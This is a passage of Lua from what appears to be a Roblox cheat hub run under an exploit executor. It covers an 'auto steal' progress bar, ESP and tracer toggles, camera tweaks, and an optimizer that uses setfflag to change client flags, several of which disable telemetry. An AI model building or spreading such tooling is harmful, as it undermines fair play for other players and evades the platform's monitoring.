		resizeBtn.Position = UDim2.new(1, -22, 0, 3)
		resizeUpBtn.Size = UDim2.fromOffset(16, 16)
		resizeUpBtn.Position = UDim2.new(1, -42, 0, 3)
		resizeUpBtn.TextSize = 10
		resizeBtn.TextSize = 10
		for _, child in ipairs(barFill:GetChildren()) do
			if child.Name == "ProgressInsetGlow" or child.Name == "ProgressInsetShine" then
				child.Visible = true
			end
		end
	end
	if shouldSave ~= false then pcall(saveConfig) end
	return barStyle
end
_G.__UnoSetAutoGrabBarStyle = function(style)
	return applyAutoGrabBarStyle(style, true)
end
_G.__UnoRefreshAutoGrabBarStyle = function()
	return applyAutoGrabBarStyle(barStyle, false)
end
local function applyAutoStealBarTheme(themeName)
		barThemeColor = resolveAutoStealAccent()
		fillGradient.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, barThemeColor:Lerp(Color3.fromRGB(255, 255, 255), 0.25)),
			ColorSequenceKeypoint.new(0.5, barThemeColor),
			ColorSequenceKeypoint.new(1, barThemeColor:Lerp(Color3.fromRGB(40, 0, 40), 0.2)),
		})
		barFill.BackgroundColor3 = barThemeColor
		if sLetter then sLetter.TextColor3 = barThemeColor end
		if sSub then sSub.TextColor3 = barThemeColor end
		if leftDivider then leftDivider.BackgroundColor3 = barThemeColor end
		modePill.BackgroundColor3 = barThemeColor:Lerp(Color3.fromRGB(80, 40, 160), 0.35)
		barStrokeInst.Color = barThemeColor:Lerp(Color3.fromRGB(255, 255, 255), 0.15)
		barStrokeInst.Transparency = 0.35
		if percentLabel then percentLabel.TextColor3 = Color3.fromRGB(245, 245, 250) end
		if StatsRightPing then StatsRightPing.TextColor3 = barThemeColor:Lerp(Color3.fromRGB(255, 255, 255), 0.28) end
		if statsDivider then statsDivider.BackgroundColor3 = barThemeColor:Lerp(Color3.fromRGB(0, 0, 0), 0.55) end
		-- Full-bar art by theme: halloween / red / pink / blue
		if stealBarIcon then
			local halloweenOn = (_G.__UnoHalloweenMode == true) or (toggleStates and toggleStates["Halloween Mode"] == true)
			local index = tonumber(_G["_UnoHub_UI_BgIndex"]) or 1
			if halloweenOn then
				stealBarIcon.Image = STEAL_ICON_HALLOWEEN
			elseif index == 3 then
				stealBarIcon.Image = STEAL_ICON_BLUE
			elseif index == 2 then
				stealBarIcon.Image = STEAL_ICON_PINK
			else
				stealBarIcon.Image = STEAL_ICON_RED
			end
			stealBarIcon.Visible = true
			stealBarIcon.ScaleType = Enum.ScaleType.Crop
			stealBarIcon.Size = UDim2.new(1, 0, 1, 0)
			stealBarIcon.Position = UDim2.new(0, 0, 0, 0)
		end
		applyAutoGrabBarStyle(barStyle, false)
		do
			local idx = tonumber(themeName) or tonumber(_G["_UnoHub_UI_BgIndex"]) or 1
			if type(_G.__UnoSetStealBarParticles) == "function" then
				pcall(_G.__UnoSetStealBarParticles, idx == 2, idx)
			elseif type(setThemeParticles) == "function" then
				pcall(setThemeParticles, idx == 2, idx)
			end
		end
	end

	-- Pink particles ONLY when pink theme (bgIndex == 2)
	local particleLayer = Instance.new("Frame", grabBarGui)
	particleLayer.Name = "ThemeParticles"
	particleLayer.Size = UDim2.new(1, 0, 1, 0)
	particleLayer.BackgroundTransparency = 1
	particleLayer.ZIndex = 520
	particleLayer.ClipsDescendants = true
	particleLayer.Visible = false
	local particlesOn = false
	local particleConn = nil
	local spawnAcc = 0

	local function clearParticles()
		for _, ch in ipairs(particleLayer:GetChildren()) do
			pcall(function() ch:Destroy() end)
		end
	end

	local function stopParticles()
		particlesOn = false
		particleLayer.Visible = false
		if particleConn then
			pcall(function() particleConn:Disconnect() end)
			particleConn = nil
		end
		clearParticles()
	end

	local function startPinkParticles()
		if particlesOn and particleConn then
			particleLayer.Visible = true
			return
		end
		stopParticles()
		particlesOn = true
		particleLayer.Visible = true
		spawnAcc = 0
		particleConn = RunService.Heartbeat:Connect(function(dt)
			if not particlesOn then return end
			if not grabBarGui.Parent or grabBarGui.Visible == false then return end
			spawnAcc = spawnAcc + (dt or 0)
			local barW = math.max(1, grabBarGui.AbsoluteSize.X)
			local barH = math.max(1, grabBarGui.AbsoluteSize.Y)
			while spawnAcc >= 0.055 do
				spawnAcc = spawnAcc - 0.055
				if #particleLayer:GetChildren() >= 36 then break end
				local p = Instance.new("Frame")
				local sz = math.random(3, 6)
				p.Size = UDim2.fromOffset(sz, sz)
				p.Position = UDim2.fromOffset(math.random(0, math.floor(barW)), -sz)
				p.BackgroundColor3 = Color3.fromRGB(255, math.random(80, 170), math.random(180, 240))
				p.BackgroundTransparency = math.random(5, 25) / 100
				p.BorderSizePixel = 0
				p.ZIndex = 521
				Instance.new("UICorner", p).CornerRadius = UDim.new(1, 0)
				p.Parent = particleLayer
				local speed = math.random(32, 62)
				local drift = math.random(-14, 14)
				local life = 0
				-- fade out near the bottom of the bar (not at the hard UI edge)
				local fadeStart = math.max(8, barH * 0.55)
				local fadeEnd = math.max(fadeStart + 6, barH * 0.92)
				local pConn
				pConn = RunService.Heartbeat:Connect(function(pdt)
					if not p.Parent then
						if pConn then pConn:Disconnect() end
						return
					end
					life = life + (pdt or 0)
					local y = life * speed
					local x = p.Position.X.Offset + drift * (pdt or 0)
					p.Position = UDim2.fromOffset(x, y - sz)
					local baseT = 0.08
					if y >= fadeEnd then
						if pConn then pConn:Disconnect() end
						p:Destroy()
						return
					elseif y >= fadeStart then
						local fadeT = (y - fadeStart) / math.max(1, fadeEnd - fadeStart)
						p.BackgroundTransparency = math.clamp(baseT + fadeT * 0.92, 0, 1)
					else
						p.BackgroundTransparency = baseT
					end
				end)
			end
		end)
		_G.__UnoTrackConn(particleConn)
	end

	local function setThemeParticles(enabled, index)
		-- particles disabled (no pink particles on any theme)
		stopParticles()
	end

	local function setPinkParticles(enabled)
		local idx = tonumber(_G["_UnoHub_UI_BgIndex"]) or 1
		setThemeParticles(idx == 2, idx)
	end

	_G.__UnoApplyAutoStealBarTheme = applyAutoStealBarTheme
	_G.__UnoSetStealBarParticles = setThemeParticles
	applyAutoStealBarTheme(_G.__UnoGuiTheme or "GUI 1")
	do
		local idx = tonumber(_G["_UnoHub_UI_BgIndex"]) or 1
		setThemeParticles(idx == 2, idx)
	end

	-- Keep aliases used by the update loop
	local barLabel = autoGrabTitle
	local statusLabel = autoGrabTitle
	local barPercentLabel = percentLabel
	local autoGrabModeLabels = { v1 = "V1", v2 = "V2" }
	local function autoGrabModeName(mode)
		return autoGrabModeLabels[mode] or "V1"
	end
	local titleLabel = modePill
	titleLabel.Text = autoGrabModeName(autoStealMode)
	local function refreshModePill()
		modePill.Text = string.upper(tostring(autoStealMode or "v1"))
	end
	refreshModePill()

	local function switchAutoStealVersion()
		autoStealMode = (autoStealMode == "v2") and "v1" or "v2"
		refreshModePill()
		-- restart auto steal if running so version applies
		if toggleStates["auto steal"] and FeaturePostToggle["auto steal"] then
			pcall(FeaturePostToggle["auto steal"], false)
			pcall(FeaturePostToggle["auto steal"], true)
		end
		if _G.UnoAutoGrab and _G.UnoAutoGrab.SetMode then
			pcall(_G.UnoAutoGrab.SetMode, autoStealMode)
		end
		-- sync main UI button text
		if type(_G.__UnoRefreshAutoStealModeUI) == "function" then
			pcall(_G.__UnoRefreshAutoStealModeUI, autoStealMode)
		end
		saveConfig()
		return autoStealMode
	end
	_G.__UnoSwitchAutoStealVersion = switchAutoStealVersion
	_G.__UnoRefreshStealBarModePill = refreshModePill

	modePill.MouseButton1Click:Connect(function()
		switchAutoStealVersion()
	end)

	local _barDragging = false
	local _barDragStart = nil
	local _barDragInput = nil
	_G.__UnoGuiPositionResetters.AutoGrab = function()
	_barDragging = false
	_barDragStart = nil
	_barDragInput = nil
	grabBarGui.AnchorPoint = Vector2.new(0, 0)
	grabBarGui.Position = UDim2.new(0.5, -currentW / 2, 0.80, 0)
	_G["_UnoHub_UI_AutoGrabBarPos"] = nil
	end
	grabBarGui.InputBegan:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
	_barDragging = true
	_barDragStart = { pointer = inp.Position, position = grabBarGui.Position }
	if inp.UserInputType == Enum.UserInputType.Touch then _barDragInput = inp end
	end
	end)
	grabBarGui.InputChanged:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
	_barDragInput = inp
	end
	end)
	_G.__UnoTrackConn(UserInputService.InputChanged:Connect((function(inp)
	if not _barDragging or not _barDragStart or inp ~= _barDragInput then return end
	if inp.UserInputType ~= Enum.UserInputType.MouseMovement and inp.UserInputType ~= Enum.UserInputType.Touch then return end
	local delta = inp.Position - _barDragStart.pointer
	local nextX = _barDragStart.position.X.Offset + delta.X
	local nextY = _barDragStart.position.Y.Offset + delta.Y
	grabBarGui.Position = UDim2.fromOffset(nextX, nextY)
	end)))
	_G.__UnoTrackConn(UserInputService.InputEnded:Connect(function(inp)
	if _barDragging and (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) then
	-- Aplică și ultima poziție a cursorului la eliberare; ultimul InputChanged
	-- poate sosi înainte ca cursorul să ajungă chiar la marginea de jos.
	local delta = inp.Position - _barDragStart.pointer
	local finalX = _barDragStart.position.X.Offset + delta.X
	local finalY = _barDragStart.position.Y.Offset + delta.Y
	_barDragging = false
	grabBarGui.AnchorPoint = Vector2.new(0, 0)
	grabBarGui.Position = UDim2.fromOffset(finalX, finalY)
	_G["_UnoHub_UI_AutoGrabBarPos"] = { x = finalX, y = finalY }
	_barDragStart = nil
	_barDragInput = nil
	saveConfig()
	end
	end))

	local grabBarState = {
	displayProgress = 0,
	radiusProgress = 0,
	targetInRadius = false,
	radiusCheckElapsed = 0,
	uiElapsed = 0,
	lastVisible = nil,
	lastPercent = nil,
	lastActive = nil,
	lastMode = nil,
	}
	FeaturePostToggle["Steal Bar"] = function(active)
		local visible = active == true
		grabBarGui.Visible = visible
		grabBarState.lastVisible = visible
	end
	_G.__UnoTrackConn(RunService.Heartbeat:Connect((function(dt)

	grabBarState.uiElapsed = grabBarState.uiElapsed + (dt or 0)
	if grabBarState.uiElapsed < (1 / 20) then return end
	dt = grabBarState.uiElapsed
	grabBarState.uiElapsed = 0
	if grabBarState.lastMode ~= autoStealMode then
	grabBarState.lastMode = autoStealMode
	if modePill then modePill.Text = autoGrabModeName(autoStealMode) end
	end

	if toggleStates["Steal Bar"] ~= true then
	if grabBarState.lastVisible ~= false then
	grabBarGui.Visible = false
	grabBarState.lastVisible = false
	end
	return
	end

	grabBarState.radiusCheckElapsed = grabBarState.radiusCheckElapsed + (dt or 0)
	local ragdollBlocked = _G.__UnoAutoGrabRagdollBlocked == true
	if ragdollBlocked then
	grabBarState.targetInRadius = false
	grabBarState.radiusProgress = 0
	end
	if grabBarState.radiusCheckElapsed >= 0.25 then
	grabBarState.radiusCheckElapsed = 0
	grabBarState.targetInRadius = false
	local autoGrabBusy = (StealState and StealState.active)
		or (V2 and V2.busy) or (V3New and V3New.busy)
		or (V2Grab and V2Grab.busy)

	if not ragdollBlocked and not autoGrabBusy and toggleStates["auto steal"] == true and _G.__UnoAutoGrabTargetInRadius then
	local activeRadius = math.clamp(tonumber(autoStealValues.Radius) or 65, 10, 150)
	local ok, inRange = pcall(_G.__UnoAutoGrabTargetInRadius, activeRadius)
	grabBarState.targetInRadius = ok and inRange == true
	end
	end

	local actualProgress = ragdollBlocked and 0 or math.clamp(v1Progress or 0, 0, 1)
	if grabBarState.targetInRadius then
	if actualProgress > 0 then
	grabBarState.radiusProgress = actualProgress
	else
	local fillDuration = math.max(0.1, tonumber(autoStealValues.Duration) or 1.3)
	grabBarState.radiusProgress = grabBarState.radiusProgress + (dt or 0) / fillDuration
	if grabBarState.radiusProgress >= 1 then grabBarState.radiusProgress = 0 end
	end
	else
	grabBarState.radiusProgress = 0
	end

	local progress = math.max(actualProgress, grabBarState.radiusProgress)
	local totalW = barBg.AbsoluteSize.X
	if totalW <= 0 then totalW = grabBarGui.AbsoluteSize.X - (isMobile and 76 or 88) end
	if totalW <= 0 then totalW = isMobile and 192 or 222 end
	local targetW = math.clamp(progress * totalW, 0, totalW)
	local currentW = grabBarState.displayProgress * totalW
	local lerpSpeed = progress > grabBarState.displayProgress and 18 or 22
	currentW = currentW + (targetW - currentW) * math.min(lerpSpeed * dt, 1)
	if math.abs(currentW - targetW) < 0.5 then currentW = targetW end
	grabBarState.displayProgress = totalW > 0 and math.clamp(currentW / totalW, 0, 1) or 0
	barFill.Size = UDim2.new(0, currentW, 1, 0)

	local shouldShowGrab = toggleStates["Steal Bar"] == true
	if shouldShowGrab ~= grabBarState.lastVisible then
	grabBarGui.Visible = shouldShowGrab
	grabBarState.lastVisible = shouldShowGrab
	end

	do
	local pct = math.floor(progress * 100)
	pct = math.clamp(pct, 0, 100)
	if pct ~= grabBarState.lastPercent then
	percentLabel.Text = tostring(pct) .. "%"
	if barPercentLabel then barPercentLabel.Text = tostring(pct) .. "%" end
	grabBarState.lastPercent = pct
	end
	end
	local grabIsActive = progress > 0
	if grabIsActive and grabBarState.lastActive ~= true then
	barFill.BackgroundColor3 = barThemeColor
	barStrokeInst.Color = barThemeColor:Lerp(Color3.fromRGB(255, 255, 255), 0.12)
	barStrokeInst.Transparency = 0.12
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	end
	grabBarState.lastActive = grabIsActive
	end)))
	end)()

	local visualSection = makeUraniumSection(tabPages.Visuals, "VISUALS")
	makeToggleNoKeybind(visualSection, "Anti Lag", "Anti Lag")
	_G.__visualSection = visualSection

	makeToggleNoKeybind(visualSection, "ESP Players", "ESP Players")
	makeToggleNoKeybind(visualSection, "Player Tracers", "Player Tracers")

	local optimizerMode = "Ultra"
	local optimizerModeRefreshers = {}
	local applySky
	local skyCurrentMode
	local function refreshOptimizerModeUI()
	for _, refresh in ipairs(optimizerModeRefreshers) do pcall(refresh, optimizerMode) end
	end
	local function setOptimizerMode(mode)
	if mode ~= "Normal" and mode ~= "Ultra" then mode = "Normal" end
	optimizerMode = mode
	_G.__optimizerMode = mode
	refreshOptimizerModeUI()
	pcall(saveConfig)
	if toggleStates["Optimizer"] and FeaturePostToggle["Optimizer"] then
	FeaturePostToggle["Optimizer"](false)
	FeaturePostToggle["Optimizer"](true)
	end
	end
	if _G.__optimizerMode == "Normal" or _G.__optimizerMode == "Ultra" then
	optimizerMode = _G.__optimizerMode
	else
	_G.__optimizerMode = optimizerMode
	end

	do
	local optimizerActive = false
	local optimizerConn = nil
	local optimizerLightingConn = nil
	local optimizerCharConn = nil
	local optimizerWalkCancel = nil
	local defLightBrightness, defLightClock, defLightAmbient
	local removeAccessoriesEnabled = false
	local lowHarshUntil = 0
	local lowFlagGeneration = 0
	local optimizerUltraOriginals = {}

	local function rememberUltraState(obj, state)
	if optimizerUltraOriginals[obj] == nil then optimizerUltraOriginals[obj] = state end
	end

	local function restoreUltraState()
	for obj, original in pairs(optimizerUltraOriginals) do
	pcall(function()
	if original.Parent ~= nil and obj.Parent == nil and original.Parent.Parent ~= nil then
	obj.Parent = original.Parent
	end
	if obj.Parent ~= nil then
	if original.Material ~= nil then obj.Material = original.Material end
	if original.Reflectance ~= nil then obj.Reflectance = original.Reflectance end
	if original.CastShadow ~= nil then obj.CastShadow = original.CastShadow end
	if original.Transparency ~= nil then obj.Transparency = original.Transparency end
	if original.Enabled ~= nil then obj.Enabled = original.Enabled end
	end
	end)
	end
	optimizerUltraOriginals = {}
	end

	local lowFlags = {
	{"DFIntClusterSenderMaxJoinBandwidthBps", "2100000000"},
	{"DFIntClusterSenderMaxUpdateBandwidthBps", "2100000000"},
	{"DFIntServerFramesBetweenJoins", "1"},
	{"DFIntRaknetBandwidthInfluxHundredthsPercentageV2", "10000"},
	{"DFIntConnectionMTUSize", "1400"},
	{"FIntRakNetResendBufferArrayLength", "1024"},
	{"DFIntRakNetNakResendDelayMsMax", "1"},
	{"DFIntWaitOnUpdateNetworkLoopEndedMS", "100"},
	{"DFIntWaitOnRecvFromLoopEndedMS", "100"},
	{"DFIntLargePacketQueueSizeCutoffMB", "1000"},
	{"DFIntSendRakNetStatsInterval", "2147483647"},
	{"DFIntRakNetLoopMs", "1"},
	{"DFIntRakNetSelectTimeoutMs", "1"},
	{"DFIntNetworkClusterPacketCacheNumParallelTasks", "8"},
	{"DFIntReplicationDataCacheNumParallelTasks", "8"},
	{"DFIntMegaReplicatorNumParallelTasks", "16"},
	{"DFIntMegaReplicatorNetworkQualityProcessorUnit", "10"},
	{"DFIntMaxProcessPacketsStepsPerCyclic", "512"},
	{"DFIntMaxProcessPacketsStepsAccumulated", "0"},
	{"DFIntMaxProcessPacketsJobScaling", "1000"},
	{"DFIntClientPacketMaxFrameMicroseconds", "200000"},
	{"DFIntClientPacketExcessMicroseconds", "10000"},
	{"DFIntClientPacketMinMicroseconds", "1"},
	{"DFIntClientPacketMaxDelayMs", "1"},
	{"DFIntMaxWaitTimeBeforeForcePacketProcessMS", "1"},
	{"DFIntMaxFrameBufferSize", "4"},
	{"DFIntBufferCompressionThreshold", "100"},
	{"DFIntOverrideISRReplicatorStepBandwidthBytes", "131072"},
	{"DFIntTaskSchedulerJobInitThreads", "8"},
	{"DFIntTaskSchedulerJobInGameThreads", "8"},
	{"FIntTaskSchedulerAutoThreadLimit", "16"},
	{"FIntTaskSchedulerAsyncTasksMinimumThreadCount", "4"},
	{"DFIntRuntimeConcurrency", "16"},
	{"FIntSimWorldTaskQueueParallelTasks", "20"},
	{"DFIntHttpBatchLimit", "256"},
	{"FIntHttpBatchLimit", "256"},
	{"DFIntHttpCurlConnectionCacheSize", "512"},
	{"FIntDefaultMeshCacheSizeMB", "512"},
	{"DFIntMemCacheMaxCapacityMB", "256"},
	{"DFIntNumAssetsMaxToPreload", "1"},
	{"DFFlagEnableSoundPreloading", "false"},
	{"FFlagSlimContentProvider", "true"},
	{"DFFlagDebugSkipMeshVoxelizer", "true"},
	{"DFFlagTextureQualityOverrideEnabled", "true"},
	{"DFIntTextureQualityOverride", "0"},
	{"FIntDebugTextureManagerSkipMips", "7"},
	{"DFIntDebugLimitMinTextureResolutionWhenSkipMips", "8"},
	{"FFlagTM2SkipMipsForUnstreamable2", "true"},
	{"DFFlagDoNotSkipMipsBasedOnSystemMemoryPS", "true"},
	{"FFlagRenderUseTextureManager224", "false"},
	{"DFIntDebugFRMQualityLevelOverride", "1"},
	{"DFFlagDebugPauseVoxelizer", "true"},
	{"FFlagFastGPULightCulling3", "true"},
	{"FIntRenderLocalLightFadeInMs", "0"},
	{"FIntRenderLocalLightUpdatesMax", "1"},
	{"FIntRenderShadowmapBias", "0"},
	{"FIntSSAOMipLevels", "0"},
	{"FIntDebugForceMSAASamples", "1"},
	{"FIntDebugFRMOptionalMSAALevelOverride", "0"},
	{"FIntRobloxGuiBlurIntensity", "0"},
	{"FIntFRMMinGrassDistance", "0"},
	{"FIntFRMMaxGrassDistance", "0"},
	{"DFFlagCoreScriptTelemetry2", "false"},
	{"DFFlagBrowserTrackerIdTelemetryEnabled", "false"},
	{"FFlagPerfDataOnTelemetryV2", "false"},
	{"FFlagSendRenderFidelityTelemetry2", "false"},
	{"FFlagEnableTelemetryServiceMemoryCPUInfo", "false"},
	{"DFIntTelemetryProfilerHundredthsPercentage", "0"},
	{"FIntTelemetryProfilerFrequency", "0"},
	{"FIntPerformanceTelemetryQueueProcessLimit", "0"},
	{"DFIntContentProviderPreloadHangTelemetryHundredthsPercentage", "0"},
	}

	local function applyLowFlags()
	local env = (getgenv and getgenv()) or _G
	local setter = rawget(env, "setfflag") or rawget(_G, "set_fflag")
	local getter = rawget(env, "getfflag") or rawget(_G, "get_fflag")
	if type(setter) ~= "function" then return end
	for _, flag in ipairs(lowFlags) do
	local canSet = true
	if type(getter) == "function" then
	local ok, current = pcall(getter, flag[1])
	canSet = ok and current ~= nil
	end
	if canSet then pcall(setter, flag[1], tostring(flag[2])) end
	end
	end

	local function applyLowPermanentSettings()
	pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
	pcall(function()
	UserSettings():GetService("UserGameSettings").SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
	end)
	pcall(function()
	Lighting.GlobalShadows = false
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	end)
	pcall(function()
	local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
	if atmosphere then
	atmosphere.Density = 0
	atmosphere.Glare = 0
	atmosphere.Haze = 0
	end
	end)
	pcall(function()
	local terrain = workspace:FindFirstChildOfClass("Terrain")
	if terrain then
	terrain.Decoration = false
	terrain.WaterWaveSize = 0
	terrain.WaterWaveSpeed = 0
	terrain.WaterReflectance = 0
	local clouds = terrain:FindFirstChildOfClass("Clouds")
	if clouds then clouds.Enabled = false end
	end
	end)
	end

	local applyOptimizerDerender = (function(obj)
	pcall(function()
	if _G.__UnoPreserveOptimizerUI(obj) then return end
	if optimizerMode ~= "Ultra" then
	if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke")
	or obj:IsA("Fire") or obj:IsA("Sparkles") or obj:IsA("PostEffect") then
	obj.Enabled = false
	end
	if tick() <= lowHarshUntil then
	if obj:IsA("Decal") or obj:IsA("Texture") then
	obj.Transparency = 1
	end
	end
	return
	end
	local objName = obj.Name or ""
	local parentName = (obj.Parent and obj.Parent.Name) or ""
	local grandParentName = (obj.Parent and obj.Parent.Parent and obj.Parent.Parent.Name) or ""
	if obj:IsA("Accessory") or obj:IsA("Hat") or obj:IsA("Clothing")
	or obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("ShirtGraphic") then
	rememberUltraState(obj, {Parent = obj.Parent})
	obj.Parent = nil
	elseif obj:IsA("BasePart") then
	rememberUltraState(obj, {
	Material = obj.Material,
	Reflectance = obj.Reflectance,
	CastShadow = obj.CastShadow,
	})
	obj.Material = Enum.Material.Plastic
	obj.Reflectance = 0
	obj.CastShadow = false
	elseif obj:IsA("Decal") or obj:IsA("Texture") then
	rememberUltraState(obj, {Transparency = obj.Transparency})
	obj.Transparency = 1
	elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
	or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
	rememberUltraState(obj, {Enabled = obj.Enabled})
	obj.Enabled = false
	elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
	for _, track in ipairs(obj:GetPlayingAnimationTracks()) do
	pcall(function() track:Stop(0) end)
	end
	end
	end)
	end)

	local processAllDescendants = (function()
	local roots = optimizerMode == "Ultra" and {workspace} or {workspace, Lighting}
	if optimizerWalkCancel then optimizerWalkCancel() end
	optimizerWalkCancel = _G.__UnoWalkDescendantsBatched(roots, applyOptimizerDerender, function()
	return optimizerActive
	end)
	end)

	local function applyOptimizerLighting()
	defLightBrightness = defLightBrightness or Lighting.Brightness
	defLightClock = defLightClock or Lighting.ClockTime
	defLightAmbient = defLightAmbient or Lighting.OutdoorAmbient
	if optimizerMode ~= "Ultra" then
	applyLowPermanentSettings()
	return
	end
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 1e10
	Lighting.Brightness = 1
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	for _, effect in ipairs(Lighting:GetChildren()) do
	pcall(function()
	if effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect")
	or effect:IsA("ColorCorrectionEffect") or effect:IsA("BloomEffect")
	or effect:IsA("DepthOfFieldEffect") then effect.Enabled = false end
	end)
	end
	end

	local function resetOptimizerLighting()
	pcall(function()
	if defLightBrightness then Lighting.Brightness = defLightBrightness end
	if defLightClock then Lighting.ClockTime = defLightClock end
	if defLightAmbient then Lighting.OutdoorAmbient = defLightAmbient end
	Lighting.ExposureCompensation = 0
	Lighting.GlobalShadows = true
	Lighting.FogEnd = 100000
	Lighting.EnvironmentDiffuseScale = 1
	Lighting.EnvironmentSpecularScale = 1
	end)
	end

	FeaturePostToggle["Optimizer"] = function(active)
	if active then
	if optimizerActive then return end

	removeAccessoriesEnabled = true
	optimizerActive = true
	if optimizerMode ~= "Ultra" then
	lowHarshUntil = tick() + 1
	lowFlagGeneration = lowFlagGeneration + 1
	local generation = lowFlagGeneration
	applyLowFlags()
	for _, delaySeconds in ipairs({2, 6, 12, 20}) do
	task.delay(delaySeconds, function()
	if optimizerActive and optimizerMode ~= "Ultra" and generation == lowFlagGeneration then
	applyLowFlags()
	end
	end)
	end
	pcall(function() game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen() end)
	end
	applyOptimizerLighting()
	if toggleStates["Sky Changer"] then
	applySky(skyCurrentMode)
	end
	processAllDescendants()

	if optimizerConn then optimizerConn:Disconnect() end
optimizerConn = workspace.DescendantAdded:Connect(function(obj)
if removeAccessoriesEnabled then
applyOptimizerDerender(obj)
end
end)
	if optimizerLightingConn then optimizerLightingConn:Disconnect() end
	optimizerLightingConn = Lighting.DescendantAdded:Connect(function(obj)
	if removeAccessoriesEnabled then applyOptimizerDerender(obj) end
	end)

	if optimizerCharConn then optimizerCharConn:Disconnect() end
	optimizerCharConn = Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	_G.__UnoWalkDescendantsBatched(char, applyOptimizerDerender, function() return optimizerActive end)
	end)

	print("[Optimizer] Anti Lag ACTIVATED - Mode " .. optimizerMode)
	else
	if not optimizerActive then return end

	removeAccessoriesEnabled = false
	optimizerActive = false
	if optimizerWalkCancel then optimizerWalkCancel(); optimizerWalkCancel = nil end
	lowFlagGeneration = lowFlagGeneration + 1
	restoreUltraState()

	if optimizerConn then
	optimizerConn:Disconnect()
	optimizerConn = nil
	end
	if optimizerLightingConn then
	optimizerLightingConn:Disconnect()
	optimizerLightingConn = nil
	end

	if optimizerCharConn then
	optimizerCharConn:Disconnect()
	optimizerCharConn = nil
	end

	if toggleStates["Sky Changer"] then
	applySky(skyCurrentMode)
	else
	resetOptimizerLighting()
	end
	print("[Optimizer] Anti Lag DEACTIVATED")
end
end
end
_G.__UnoTrackStopper(function()
if optimizerActive and FeaturePostToggle["Optimizer"] then FeaturePostToggle["Optimizer"](false) end
end)

	makeToggleWithInput(visualSection, "FOV", "Custom FOV", "FOV",
	function(v) return tostring(v) end,
	function(n) return math.clamp(math.floor(n+0.5), 30, 120) end
	)

	do
	local fovActive = false
	local fovConn = nil
	local defaultFOV = 90
	local originalFOV = nil

	local function enableFOV()
	if fovActive then return end
	fovActive = true
	toggleStates["Custom FOV"] = true
	if fovConn then fovConn:Disconnect() end
	local cam = workspace.CurrentCamera
	if cam and originalFOV == nil then originalFOV = cam.FieldOfView end

	fovConn = RunService.RenderStepped:Connect((function()
	if not fovActive then return end
	local activeCamera = workspace.CurrentCamera
	local desiredFOV = speedValues.FOV or 90
	if activeCamera and math.abs(activeCamera.FieldOfView - desiredFOV) > 0.01 then
	activeCamera.FieldOfView = desiredFOV
	end
	end))
	if cam then cam.FieldOfView = speedValues.FOV or 90 end
	task.defer(saveConfig)
	end

	local function disableFOV()
	if not fovActive then return end
	fovActive = false
	toggleStates["Custom FOV"] = false
	if fovConn then
	fovConn:Disconnect()
	fovConn = nil
	end
	local cam = workspace.CurrentCamera
	if cam then cam.FieldOfView = originalFOV or defaultFOV end
	originalFOV = nil
	task.defer(saveConfig)
	end

	FeaturePostToggle["Custom FOV"] = function(active)
	if active then enableFOV() else disableFOV() end
	end
	_G.__UnoTrackStopper(disableFOV)

	if toggleStates["Custom FOV"] then task.defer(enableFOV) end
	end

	makeToggleNoKeybind(visualSection, "Stretchz Res", "Stretchz Res")
	do
	local stretchRezEnabled = false
	local stretchRezConn = nil
	local STRETCH_FOV = 90
	local DEFAULT_FOV = 90

	local function applyStretchFOV(val)
	local cam = workspace.CurrentCamera
	if cam then
	pcall(function() cam.FieldOfView = val end)
	end
	end

	local function enableStretchRez()
	if stretchRezEnabled then return end
	stretchRezEnabled = true
	toggleStates["Stretchz Res"] = true

	local cam = workspace.CurrentCamera
	if not cam then return end

	if stretchRezConn then stretchRezConn:Disconnect() end
	stretchRezConn = RunService.RenderStepped:Connect((function()
	if not stretchRezEnabled then return end
	applyStretchFOV(STRETCH_FOV)
	pcall(function()
	cam.CFrame = cam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.7, 0, 0, 0, 1)
	end)
	end))

	applyStretchFOV(STRETCH_FOV)
	task.defer(saveConfig)
	end

	local function disableStretchRez()
	stretchRezEnabled = false
	toggleStates["Stretchz Res"] = false
	if stretchRezConn then
	stretchRezConn:Disconnect()
	stretchRezConn = nil
	end
	local cam = workspace.CurrentCamera
	if cam then
	pcall(function() cam.FieldOfView = DEFAULT_FOV end)
	end
	task.defer(saveConfig)
	end

	FeaturePostToggle["Stretchz Res"] = function(active)
	if active then enableStretchRez() else disableStretchRez() end
	end
	_G.__UnoTrackStopper(disableStretchRez)

	if toggleStates["Stretchz Res"] then task.defer(enableStretchRez) end
	end


	-- Violette custom skins: preset data and asset application.
	do
	local originals=setmetatable({}, {__mode="k"})
	local generation=0
	local enabled=false
	local function mark(o) pcall(function() o:SetAttribute("_UnoVioletteSkin",true) end); return o end
	local function clearObjects(c)
		if not c then return end
		for _,o in ipairs(c:GetDescendants()) do if o:GetAttribute("_UnoVioletteSkin") then pcall(function() o:Destroy() end) end end
	end
	local function clearAccessories(c)
		if not c then return end
		for _,o in ipairs(c:GetChildren()) do if o:IsA("Accessory") or o:IsA("Accoutrement") then pcall(function() o:Destroy() end) end end
	end
	local function attach(c,h,a)
		if not a or not a:IsA("Accessory") then return false end
		mark(a); pcall(function() h:AddAccessory(a) end); if a.Parent~=c then a.Parent=c end
